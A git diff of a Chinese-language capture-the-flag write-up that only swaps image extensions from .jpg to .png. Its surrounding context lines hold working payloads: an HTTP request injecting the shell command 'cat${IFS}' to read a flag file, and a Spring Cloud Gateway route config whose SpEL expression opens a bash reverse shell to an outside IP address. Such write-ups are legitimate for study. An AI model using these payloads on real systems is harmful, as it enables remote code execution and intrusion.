@@ -198,7 +198,7 @@ go mod tidy
 go run main.go
 ```
 
-![image](./assets/001.jpg)
+![image](./assets/001.png)
 
 成功拿到了
 
@@ -266,7 +266,7 @@ if __name__ == "__main__":
 
 这个包写了好久，原因就是正常的文件上传都是POST请求而这里如果是POST就直接变成404，后面发现GET反而可以
 
-![image](./assets/004.jpg)
+![image](./assets/004.png)
 
 ```http
 GET /flask?name=?name=cat${IFS}/th1s_1s_f13g HTTP/1.1
@@ -308,7 +308,7 @@ go: downloading github.com/gorilla/sessions v1.2.1
 
 其中这个FormFile要求了常见的上传文件数据包所需要的东西multipart 表单数据等等，那么这个就是解析文件的，再找一个上传文件的，原来这两个挨着的
 
-![image](./assets/006.jpg)
+![image](./assets/006.png)
 
 那现在也就是要调用这两个方法，我们要明白这两个函数的参数是啥(零基础go所以做的麻烦)
 
@@ -376,13 +376,13 @@ if __name__ == "__main__":
 
 是一个java的题目，拿到源码先反编译
 
-![image](./assets/007.jpg)
+![image](./assets/007.png)
 
 看到有这个配置，发现内部配置服务有个8848的gateway服务，id为backcfg
 
 那我们可以直接覆盖弹shell
 
-![image](./assets/008.jpg)
+![image](./assets/008.png)
 
 首先先进后台是个NDAY，创建用户
 
@@ -427,7 +427,7 @@ spring:
                 value: "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/156.238.233.9/9999 0>&1'}).getInputStream())).replaceAll('\n','').replaceAll('\r','')}"
 ```
 
-![image](./assets/009.jpg)
+![image](./assets/009.png)
 
 打个NDAY找半天怎么放poc哈哈
 
